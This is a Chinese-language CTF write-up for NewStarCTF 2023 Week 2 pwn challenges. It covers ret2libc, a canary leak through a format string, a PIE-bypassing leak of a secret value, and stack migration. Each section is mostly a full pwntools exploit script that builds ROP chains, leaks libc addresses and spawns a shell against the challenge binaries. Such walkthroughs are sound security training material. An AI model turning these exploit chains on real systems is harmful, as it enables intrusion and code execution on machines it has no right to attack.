# NewStarCTF2023-Week2-Pwn


# ret2libc

在解题之前先讲下32位和64位程序调用函数的区别：

## 32位调用方式

栈自顶而下分别是：被调函数，被调函数的返回地址，参数1，参数2，参数3（参数自右向左进入栈）

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/20200722103740464.PNG)

## 64位调用方式

前六个参数（如果有）依次存放在RDI，RSI，RDX，RCX，R8，R9上。如果还有参数，第七个参数开始，按照32位的方式放在栈上。

![img](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/20200722160228795.PNG)

这题题意非常清晰，就是标准的ret2libc，因此也不做其他解释。

这里远程地址的libc和本地不一样，而且大概率本地的libc在库中找不到。于是我采用了本地调用本地libc的，远程查询libc库的方法来解题，libc库的版本已经标识在代码中。

> 这里提供本地的exploit

```python
from pwn import *

context(arch = 'amd64', os = 'linux')
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']
elf = ELF('./ret2libc')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#r = remote('node4.buuoj.cn',29791)
r = process('./ret2libc')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
ret_addr = 0x400506
pop_rdi_ret = 0x400763


payload = cyclic(0x28) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
r.sendafter(b'again\n',payload)

puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
info(hex(puts_addr))

#libc = libc6_2.27-3ubuntu1.5_amd64
libc_puts_addr = libc.sym['puts']
libc_system_addr = libc.sym['system']		
libc_bs_addr = 	next(libc.search(b'/bin/sh\x00'))	


libc_base = puts_addr - libc_puts_addr
system_addr = libc_base + libc_system_addr
bs_addr = libc_base + libc_bs_addr

gdb.attach(r)
payload = cyclic(0x28) + p64(ret_addr) + p64(pop_rdi_ret) + p64(bs_addr) + p64(system_addr)
#gdb.attach(r)
r.sendafter(b'again\n',payload)

r.interactive()
```

# canary

这题看到源码中printf就知道是canary泄露：

![image-20231012092308496](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231012092308496.png)

这里直接用printf(buf)泄露canay的值即可

exp:

```python
from pwn import *

context.terminal = ['tmux','splitw','-h']
context(arch = 'amd64', os = 'linux')
#context.log_level='debug'
elf = ELF('./canary')

r = remote('node4.buuoj.cn',26324)
#r = elf.process()

payload = '%11$p'
#gdb.attach(r)
r.sendafter(b'gift?\n',payload)
canary = int(r.recvuntil(b'S')[-17:-1],16)
info(hex(canary))   

backdoor = 0x401262
payload = cyclic(0x30 - 0x8) + p64(canary) + cyclic(8) + p64(backdoor)
#gdb.attach(r)
r.sendafter(b'magic\n',payload)

r.interactive()
```

# secret number

这题一开始的思路错了，以为就是rand构造相等的随机数，后来一想可能libc库不相同。

看到printf(buf)这里应该可以泄露secret的内容了。

但是这题还有个问题就是保护全开，包括PIE

![image-20231012092556512](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231012092556512.png)

但是题目可以多次泄露数据。这就好办了，先打印任意一条已知指令的地址，然后减去固定偏移就可以得到程序加载的基址，再一次溢出就可以直接泄露secret的地址了。

exp:

```python 
from pwn import *
from ctypes import *

context.terminal = ['tmux','splitw','-h']
context(arch = 'amd64', os = 'linux')
context.log_level='debug'

r = remote('node4.buuoj.cn',28036)
elf = ELF('./secretnumber')
#r = elf.process()

r.recvuntil(b'gift?(0/1)\n')
r.sendline(b'1')

r.recvuntil(b"What's it\n")
r.send(b'%17$p')	#使用的指令是main开头的指令，放在rbp的下两个位置


r.recvuntil(b'gift:\n')
base = int(r.recv(14),16) - 0x12f5	#这里算出基址
info(hex(base))

secret = base + 0x404c
info(hex(secret))

r.recvuntil(b'gift?(0/1)\n')
r.sendline(b'1')

r.recvuntil(b"What's it\n")
r.send(b'AAAAAAAA' + b'%10$sAAA' + p64(secret))	#注意这里一定要填充到8字节，否则出问题

r.recvuntil(b'AAAAAAAA')
#gdb.attach(r)
ans = u32(r.recv(4))
info(ans)

r.sendlineafter(b'gift?(0/1)\n','0')
r.sendlineafter(b'number\n',str(ans))

r.interactive()
```

# stack migration

比较标准的栈迁移，关于栈迁移的知识可以查看[Cyberangel · 语雀 (yuque.com)](https://www.yuque.com/cyberangel/)师傅的笔记。

这种题目是标准的套路，就是他泄露给你的地址就是想让你将esp迁移的位置。然后你在该地址下面直接构造ROP就行了。有后门就一次ROP，没后门就先泄露libc再ROP一样的。

exp:

```python
from pwn import *

context.terminal = ['tmux','splitw','-h']
context(arch = 'amd64', os = 'linux')
context.log_level='debug'
elf = ELF('./pwn')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
r = remote('node4.buuoj.cn',28124)
#r = elf.process()

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x401200


pop_rdi = 0x401333
leave = 0x4012aa
ret = 0x40101a

payload = b'd' * 8

r.recvuntil(b'name:\n')
r.send(payload)


r.recvuntil('you: ')
leak = int(r.recv(14),16)
info(hex(leak))

payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
payload += b'a' * (0x50 - len(payload)) + p64(leak) + p64(leave)
#gdb.attach(r)

r.recvuntil(b'plz:\n')

r.send(payload)

puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
info(hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
bin_sh_str = libc_base + next(libc.search(b'/bin/sh\x00'))
info(hex(system_addr))

r.recvuntil(b'name:\n')
payload = b'd' * 8
r.send(payload)

r.recvuntil(b'you: ')
leak = int(r.recv(14),16)
info(hex(leak))
#gdb.attach(r)
payload = p64(pop_rdi) + p64(bin_sh_str) + p64(system_addr) + p64(0)
payload += b'a' * (0x50 - len(payload)) + p64(leak) + p64(leave)

r.recvuntil(b'plz:\n')
r.send(payload)

# r.recvuntil('you: ')
# leak2 = int(r.recv(14),16)
# info(hex(leak2))
r.interactive()
```

> 这里给出libc库了，那就引用它本地的libc库即可

待续


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/10/newstarctf2023-week2-pwn/  

